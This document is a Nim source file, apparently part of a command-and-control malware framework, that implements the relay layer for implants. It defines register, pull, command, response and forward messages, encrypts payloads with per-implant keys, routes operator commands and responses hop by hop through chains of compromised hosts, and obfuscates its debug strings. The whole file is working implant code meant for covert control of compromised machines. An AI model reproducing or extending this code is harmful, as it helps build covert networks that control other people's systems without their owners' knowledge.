import json, base64, times, sequtils, strutils, tables, random, net
import ../../util/[crypto, strenc]
import relay_config

# Message types for relay communication
type
    RelayMessageType* = enum
        REGISTER = "register"
        PULL = "pull"
        COMMAND = "command"
        RESPONSE = "response"
        FORWARD = "forward"

    RelayMessage* = object
        msgType*: RelayMessageType
        fromID*: string
        route*: seq[string]
        id*: string
        payload*: string
        timestamp*: int64

    RelayImplant* = object
        id*: string
        isRelay*: bool
        upstreamHost*: string
        upstreamPort*: int
        downstreamPort*: int
        cryptoKey*: string
        registeredImplants*: Table[string, ImplantInfo]
        messageQueue*: seq[RelayMessage]
        isListening*: bool
        isConnected*: bool

    ImplantInfo* = object
        id*: string
        lastSeen*: int64
        route*: seq[string]

# Generate unique message ID
proc generateMessageID*(): string =
    randomize()
    result = $rand(1000000000..1999999999) & $epochTime().int64

# Serialize RelayMessage to JSON string
proc serialize*(msg: RelayMessage): string =
    let jsonObj = %*{
        "msgType": $msg.msgType,
        "fromID": msg.fromID,
        "route": msg.route,
        "id": msg.id,
        "payload": msg.payload,
        "timestamp": msg.timestamp
    }
    result = $jsonObj

# Deserialize JSON string to RelayMessage
proc deserialize*(jsonStr: string): RelayMessage =
    let jsonObj = parseJson(jsonStr)
    result.msgType = parseEnum[RelayMessageType](jsonObj["msgType"].getStr())
    result.fromID = jsonObj["fromID"].getStr()
    result.route = @[]
    for item in jsonObj["route"].getElems():
        result.route.add(item.getStr())
    result.id = jsonObj["id"].getStr()
    result.payload = jsonObj["payload"].getStr()
    result.timestamp = jsonObj["timestamp"].getInt()

# Encrypt payload using per-implant derived key
proc encryptPayload*(data: string, implantID: string): string =
    let implantKey = getImplantKey(implantID)
    result = encryptData(data, implantKey)

# Decrypt payload using per-implant derived key
proc decryptPayload*(encryptedData: string, implantID: string): string =
    let implantKey = getImplantKey(implantID)
    result = decryptData(encryptedData, implantKey)

# Create a new RelayMessage with per-implant encryption
proc createMessage*(msgType: RelayMessageType, fromID: string, route: seq[string], 
                   payload: string): RelayMessage =
    result.msgType = msgType
    result.fromID = fromID
    result.route = route
    result.id = generateMessageID()
    result.payload = encryptPayload(payload, fromID)  # Use sender's ID for key derivation
    result.timestamp = epochTime().int64

# Create REGISTER message
proc createRegisterMessage*(implantID: string, route: seq[string]): RelayMessage =
    let registerData = %*{
        "implantID": implantID,
        "timestamp": epochTime().int64,
        "capabilities": ["relay", "client"]
    }
    result = createMessage(REGISTER, implantID, route, $registerData)

# Create PULL message
proc createPullMessage*(implantID: string, route: seq[string]): RelayMessage =
    let pullData = %*{
        "implantID": implantID,
        "timestamp": epochTime().int64
    }
    result = createMessage(PULL, implantID, route, $pullData)

# Create COMMAND message
proc createCommandMessage*(fromID: string, targetID: string, route: seq[string], 
                          command: string, args: seq[string]): RelayMessage =
    let commandData = %*{
        "targetID": targetID,
        "command": command,
        "args": args,
        "timestamp": epochTime().int64
    }
    result = createMessage(COMMAND, fromID, route, $commandData)

# Create RESPONSE message
proc createResponseMessage*(fromID: string, route: seq[string], 
                           commandID: string, response: string): RelayMessage =
    let responseData = %*{
        "commandID": commandID,
        "response": response,
        "timestamp": epochTime().int64
    }
    result = createMessage(RESPONSE, fromID, route, $responseData)

# Create FORWARD message
proc createForwardMessage*(originalMsg: RelayMessage, newRoute: seq[string]): RelayMessage =
    result = originalMsg
    result.route = newRoute
    result.id = generateMessageID()  # New ID for forwarding

# Determine next hop in route
proc getNextHop*(route: seq[string], currentImplantID: string): string =
    let currentIndex = route.find(currentImplantID)
    if currentIndex >= 0 and currentIndex < route.len - 1:
        result = route[currentIndex + 1]
    else:
        result = ""

# Determine if message is for this implant
proc isForThisImplant*(msg: RelayMessage, implantID: string): bool =
    result = msg.route.len > 0 and msg.route[^1] == implantID

# Determine if message needs forwarding
proc needsForwarding*(msg: RelayMessage, implantID: string): bool =
    let implantIndex = msg.route.find(implantID)
    result = implantIndex >= 0 and implantIndex < msg.route.len - 1

# Update implant route information
proc updateImplantRoute*(implant: var RelayImplant, implantID: string, route: seq[string]) =
    implant.registeredImplants[implantID] = ImplantInfo(
        id: implantID,
        lastSeen: epochTime().int64,
        route: route
    )

# Add message to queue
proc queueMessage*(implant: var RelayImplant, msg: RelayMessage) =
    implant.messageQueue.add(msg)

# Get queued messages for specific implant
proc getQueuedMessages*(implant: var RelayImplant, implantID: string): seq[RelayMessage] =
    result = @[]
    var remainingMessages: seq[RelayMessage] = @[]
    
    for msg in implant.messageQueue:
        if isForThisImplant(msg, implantID):
            result.add(msg)
        else:
            remainingMessages.add(msg)
    
    implant.messageQueue = remainingMessages

# Process incoming message based on type and routing
proc processMessage*(implant: var RelayImplant, msg: RelayMessage): seq[RelayMessage] =
    result = @[]
    
    case msg.msgType:
    of REGISTER:
        let decryptedPayload = decryptPayload(msg.payload, msg.fromID)
        let registerData = parseJson(decryptedPayload)
        updateImplantRoute(implant, msg.fromID, msg.route)
        
        when defined verbose:
            echo obf("DEBUG: Registered implant ") & msg.fromID & obf(" with route ") & $msg.route
    
    of PULL:
        let queuedMessages = getQueuedMessages(implant, msg.fromID)
        for queuedMsg in queuedMessages:
            result.add(queuedMsg)
    
    of COMMAND:
        if isForThisImplant(msg, implant.id):
            # Message is for this implant, process it
            queueMessage(implant, msg)
        elif needsForwarding(msg, implant.id):
            # Forward message to next hop
            let nextHop = getNextHop(msg.route, implant.id)
            if nextHop != "":
                let forwardMsg = createForwardMessage(msg, msg.route)
                result.add(forwardMsg)
    
    of RESPONSE:
        if isForThisImplant(msg, implant.id):
            # Response is for this implant
            queueMessage(implant, msg)
        elif needsForwarding(msg, implant.id):
            # Forward response back through route
            let nextHop = getNextHop(msg.route, implant.id)
            if nextHop != "":
                let forwardMsg = createForwardMessage(msg, msg.route)
                result.add(forwardMsg)
    
    of FORWARD:
        # Handle forwarded messages
        if isForThisImplant(msg, implant.id):
            queueMessage(implant, msg)
        elif needsForwarding(msg, implant.id):
            let nextHop = getNextHop(msg.route, implant.id)
            if nextHop != "":
                let forwardMsg = createForwardMessage(msg, msg.route)
                result.add(forwardMsg)

# Initialize relay implant
proc initRelayImplant*(implantID: string): RelayImplant =
    result.id = implantID
    result.isRelay = false
    result.upstreamHost = ""
    result.upstreamPort = 0
    result.downstreamPort = 0
    result.cryptoKey = getImplantKey(implantID)  # Use derived key
    result.registeredImplants = initTable[string, ImplantInfo]()
    result.messageQueue = @[]
    result.isListening = false
    result.isConnected = false

# Clean up old messages and implant registrations
proc cleanup*(implant: var RelayImplant, maxAge: int64 = 3600) =
    let currentTime = epochTime().int64
    
    # Remove old messages
    implant.messageQueue = implant.messageQueue.filterIt(currentTime - it.timestamp < maxAge)
    
    # Remove old implant registrations
    for implantID in toSeq(implant.registeredImplants.keys):
        if currentTime - implant.registeredImplants[implantID].lastSeen > maxAge:
            implant.registeredImplants.del(implantID)

# Validate message integrity
proc validateMessage*(msg: RelayMessage): bool =
    result = msg.id != "" and msg.fromID != "" and msg.route.len > 0 and 
             msg.timestamp > 0 and msg.payload != "" 